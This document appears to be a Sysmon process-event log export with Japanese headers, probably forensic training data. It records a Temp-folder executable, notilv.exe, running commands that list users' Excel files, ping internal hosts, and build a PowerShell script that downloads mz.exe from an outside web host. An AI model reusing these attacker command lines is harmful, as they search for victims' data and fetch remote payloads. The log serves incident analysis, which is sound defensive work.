レベル,日付と時刻,ソース,イベント ID,タスクのカテゴリ
情報,2019/11/07 15:56:28,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:56:28.066
ProcessGuid: {02EA0504-591C-5A01-0000-0010B8421100}
ProcessId: 372
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:56:28,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:56:28.035
ProcessGuid: {02EA0504-591C-5A01-0000-001030431100}
ProcessId: 1428
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""2123129847-5852836191412801414-17307690952136294042-740940357-1306613022-1159133228""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:56:28,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:56:28.035
ProcessGuid: {02EA0504-591C-5A01-0000-0010B8421100}
ProcessId: 372
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""echo $p.DownloadFile(""http://anews-web.co/mz.exe"", ""C:\Intel\Logs\mz.exe"") >> C:\Intel\Logs\z.ps1""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 15:56:25,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:56:25.933
ProcessGuid: {02EA0504-5919-5A01-0000-001052241100}
ProcessId: 2152
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:2736 CREDAT:464214 /prefetch:2
CurrentDirectory: C:\Users\chiyoda.tokyo.EXAMPLE\Desktop\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=7CB7EF5B277663E56167E1E7705D7C8BFC4BD432
ParentProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ParentProcessId: 2736
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:56:07,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:56:07.821
ProcessGuid: {02EA0504-58C0-5A01-0000-00106DF31000}
ProcessId: 2540
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:56:03,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:56:03.968
ProcessGuid: {02EA0504-5903-5A01-0000-00103B1F1100}
ProcessId: 2476
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:56:03,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:56:03.968
ProcessGuid: {02EA0504-5903-5A01-0000-0010471E1100}
ProcessId: 644
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:56:03,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:56:03.953
ProcessGuid: {02EA0504-5903-5A01-0000-00103B1F1100}
ProcessId: 2476
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""413662168-1066657750-1123720917-1490064328-1057690100637355021849654289299170584""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:56:03,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:56:03.937
ProcessGuid: {02EA0504-5903-5A01-0000-0010471E1100}
ProcessId: 644
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""echo $p = New-Object System.Net.WebClient > C:\Intel\Logs\z.ps1""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 15:55:42,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:55:42.939
ProcessGuid: {02EA0504-58EB-5A01-0000-0010151B1100}
ProcessId: 664
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:55:42,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:55:42.939
ProcessGuid: {02EA0504-58EB-5A01-0000-00109D1A1100}
ProcessId: 1676
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:55:42,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:55:42.939
ProcessGuid: {02EA0504-58EB-5A01-0000-0010631C1100}
ProcessId: 2584
Image: C:\Windows\SysWOW64\PING.EXE"
情報,2019/11/07 15:55:39,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:55:39.882
ProcessGuid: {02EA0504-58EB-5A01-0000-0010631C1100}
ProcessId: 2584
Image: C:\Windows\SysWOW64\PING.EXE
CommandLine: ping  192.168.16.105
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=6AC7947207D999A65890AB25FE344955DA35028E
ParentProcessGuid: {02EA0504-58EB-5A01-0000-00109D1A1100}
ParentProcessId: 1676
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""ping 192.168.16.105"""
情報,2019/11/07 15:55:39,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:55:39.850
ProcessGuid: {02EA0504-58EB-5A01-0000-0010151B1100}
ProcessId: 664
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""20829479301510280329-9400317961761252005-171592119-250802955334246022231027375""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:55:39,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:55:39.850
ProcessGuid: {02EA0504-58EB-5A01-0000-00109D1A1100}
ProcessId: 1676
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""ping 192.168.16.105""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 15:55:18,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:55:18.931
ProcessGuid: {02EA0504-58D3-5A01-0000-00106D171100}
ProcessId: 2928
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:55:18,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:55:18.931
ProcessGuid: {02EA0504-58D3-5A01-0000-0010F5161100}
ProcessId: 2516
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:55:18,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:55:18.931
ProcessGuid: {02EA0504-58D3-5A01-0000-0010D3181100}
ProcessId: 2596
Image: C:\Windows\SysWOW64\PING.EXE"
情報,2019/11/07 15:55:15,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:55:15.795
ProcessGuid: {02EA0504-58D3-5A01-0000-0010D3181100}
ProcessId: 2596
Image: C:\Windows\SysWOW64\PING.EXE
CommandLine: ping  192.168.16.106
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=6AC7947207D999A65890AB25FE344955DA35028E
ParentProcessGuid: {02EA0504-58D3-5A01-0000-0010F5161100}
ParentProcessId: 2516
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""ping 192.168.16.106"""
情報,2019/11/07 15:55:15,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:55:15.764
ProcessGuid: {02EA0504-58D3-5A01-0000-00106D171100}
ProcessId: 2928
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-1942558625-917596623858629253839564231-130372652720633926451574616652-1441626815""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:55:15,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:55:15.764
ProcessGuid: {02EA0504-58D3-5A01-0000-0010F5161100}
ProcessId: 2516
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""ping 192.168.16.106""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 15:55:06,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:55:06.981
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\6K4KLU6DAU2LKIWDQ62P.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 06:55:06.981"
情報,2019/11/07 15:54:56,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:54:56.513
ProcessGuid: {02EA0504-58C0-5A01-0000-00106DF31000}
ProcessId: 2540
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:2736 CREDAT:3806551 /prefetch:2
CurrentDirectory: C:\Users\chiyoda.tokyo.EXAMPLE\Desktop\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=7CB7EF5B277663E56167E1E7705D7C8BFC4BD432
ParentProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ParentProcessId: 2736
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:54:55,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:54:55.421
ProcessGuid: {02EA0504-58BB-5A01-0000-00107DF01000}
ProcessId: 2416
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:54:55,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:54:55.421
ProcessGuid: {02EA0504-58BB-5A01-0000-001005F01000}
ProcessId: 1392
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:54:55,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:54:55.421
ProcessGuid: {02EA0504-58BB-5A01-0000-0010CCF11000}
ProcessId: 2588
Image: C:\Windows\SysWOW64\PING.EXE"
情報,2019/11/07 15:54:51,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:54:51.740
ProcessGuid: {02EA0504-58BB-5A01-0000-0010CCF11000}
ProcessId: 2588
Image: C:\Windows\SysWOW64\PING.EXE
CommandLine: ping  192.168.16.105
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=6AC7947207D999A65890AB25FE344955DA35028E
ParentProcessGuid: {02EA0504-58BB-5A01-0000-001005F01000}
ParentProcessId: 1392
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""ping 192.168.16.105"""
情報,2019/11/07 15:54:51,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:54:51.677
ProcessGuid: {02EA0504-58BB-5A01-0000-00107DF01000}
ProcessId: 2416
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-1144168498-941462996-2037807440750362868-11043334011451319453-3928190920026613""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:54:51,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:54:51.677
ProcessGuid: {02EA0504-58BB-5A01-0000-001005F01000}
ProcessId: 1392
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""ping 192.168.16.105""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 15:54:30,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:54:30.633
ProcessGuid: {02EA0504-58A6-5A01-0000-001049EE1000}
ProcessId: 2536
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:54:30,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:54:30.633
ProcessGuid: {02EA0504-58A6-5A01-0000-0010D1ED1000}
ProcessId: 2748
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:54:30,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:54:30.602
ProcessGuid: {02EA0504-58A6-5A01-0000-001049EE1000}
ProcessId: 2536
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-18519926041994129145-1194573195936271337-722803919-1845459794-19059635692567645""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:54:30,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:54:30.602
ProcessGuid: {02EA0504-58A6-5A01-0000-0010D1ED1000}
ProcessId: 2748
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""type C:\Intel\Logs\gg.txt""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 15:54:23,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:54:23.082
ProcessGuid: {02EA0504-5760-5A01-0000-001083601000}
ProcessId: 1140
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:54:06,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:54:06.671
ProcessGuid: {02EA0504-588E-5A01-0000-00106FE01000}
ProcessId: 2192
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:54:06,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:54:06.671
ProcessGuid: {02EA0504-588E-5A01-0000-0010F7DF1000}
ProcessId: 480
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:54:06,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:54:06.515
ProcessGuid: {02EA0504-588E-5A01-0000-00106FE01000}
ProcessId: 2192
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""1222508824390516827-632258474521428278-294794050-937943227-1138282998180917337""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 15:54:06,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:54:06.515
ProcessGuid: {02EA0504-588E-5A01-0000-0010F7DF1000}
ProcessId: 480
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""dir C:\Users\*.xls* /s /o-d > C:\Intel\Logs\gg.txt""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
